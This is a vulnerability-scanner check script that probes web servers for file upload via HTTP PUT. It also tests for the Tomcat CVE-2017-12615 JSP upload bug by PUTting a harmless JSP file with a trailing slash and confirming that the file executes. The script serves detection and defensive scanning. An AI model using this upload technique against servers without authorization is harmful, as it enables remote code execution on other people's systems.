/**
title: file upload via PUT 
tags: put, file_upload
author: bogdan
description:
    Tests if it's possible to create/upload files via HTTP method PUT.
    Also checks for CVE-2017-12615 (Tomcat bug that allows uploading of .jsp files).
**/

/// <reference path="../native.d.ts"/>

let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let rnd = ax.loadModule("/lib/utility/random.js");

let lastJob = false;

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

// alert the vulnerability
function alert(xml, job, filename) {
    scanState.addVuln({
        typeId: xml,
        location: scriptArg.location,
        http: job,
        details: { "filename": filename },
        detailsType: 1
    });
}

// check if the file was really uploaded
function confirmUrl(url, pattern) {
    // parse the url and add the path for testing
    let up = ax.url.parse(url.toString());

    // prepare a http request
    let job = ax.http.job();

    job.verb = "GET";
    job.setUrl(up);

    lastJob = ax.http.execute(job).sync();

    // check if it matches the pattern
    if (!lastJob.error
        && lastJob.response.status == 200
        && lastJob.response.body.indexOf(pattern) != -1) {
        return true;
    }

    return false;
}

// test for CVE-2017-12615
function testCVE_2017_12615(url) {
    let rndFileName = rnd.randString(8) + ".jsp";
    // jsp returns 31337
    let jspContent = '<% int output = 7*191+30000;%> <%=output %>';

    // parse the url and add the path for testing
    let up = ax.url.parse(url.toString());
    up.path += rndFileName + "/";

    // prepare a http request
    let job = ax.http.job();

    job.request.method = "PUT";
    job.setUrl(up);

    // set the request content (file body)
    job.request.body = jspContent;

    lastJob = ax.http.execute(job).sync();

    let valid = false;

    // check if a correct status code was returned
    if (!lastJob.error
        && lastJob.response.status >= 200
        && lastJob.response.status < 300) {

        // delete the last / character from path
        up.path = up.path.slice(0, -1);

        // confirm that that file was created
        if (confirmUrl(up, "31337")) {
            //trace("should alert here CVE-2017-12615");
            alert("tomcat_jsp_file_upload_CVE_2017_12615.xml", lastJob, rndFileName);
            return true;
        }
    }
    return false;
}

// check if it's possible to upload a file via PUT
function testFileUploadviaPUT(url) {
    let rndFileName = rnd.randString(8) + ".txt";
    let rndContent = rnd.randString(10);

    // parse the url and add the path for testing
    let up = ax.url.parse(url.toString());
    up.path += rndFileName;

    // prepare a http request
    let job = ax.http.job();

    job.request.method = "PUT";
    job.setUrl(up);

    // set the request content (file body)
    job.request.body = rndContent;

    lastJob = ax.http.execute(job).sync();

    let valid = false;

    // check if a correct status code was returned
    if (!lastJob.error
        && lastJob.response.status >= 200
        && lastJob.response.status < 300) {

        // confirm that that file was created
        if (confirmUrl(up, rndContent)) {
            //trace("should alert here file upload via PUT");
            alert("file_upload_via_put.xml", lastJob, rndFileName);
            return true;
        }
    }
    return false;
}

// test the vulnerability
function testVulnerability(url) {
    //trace("testing vulnerability on url: " + url);
    if (testFileUploadviaPUT(url)) {
        testCVE_2017_12615(url);
    }
}

// main function
function main() {
    var url = false;

    if (scriptArg.location.isFolder) { // test folders
        var parts = scriptArg.location.url.path.split("/");
        if (parts.length == 2) // test only root folders like /<folder> 
        {
            let rootFolder = parts[1];

            url = scriptArg.location.url;
            if (!url.path.endsWith("/")) url.path += "/";

            flow.callIdOnce(
                "file-upload-put-" + rootFolder,
                testVulnerability,
                url
            );
        }
    }
    else { // and always test the root directory
        if (scriptArg.location.url.path == "/") {
            url = scriptArg.location.url;
            testVulnerability(url);
        }
    }
}

main();
